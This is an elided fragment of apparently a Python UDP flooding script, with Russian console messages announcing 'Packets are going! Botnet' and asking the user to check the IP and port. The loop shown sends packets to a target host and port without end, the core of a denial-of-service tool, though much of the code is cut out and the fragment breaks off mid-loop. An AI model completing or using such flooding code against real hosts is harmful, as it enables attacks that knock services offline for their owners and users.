	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Пакеты пошли ! Ботнер--> \033[0m")
			else:
				s.shutdown(1)
...
if __name__ == '__main__':
	...
	try:
		...
		print("\033[91mОшибка! Проверьте правильноссть IP b Порта.\033[0m")
		usage()
	while True:
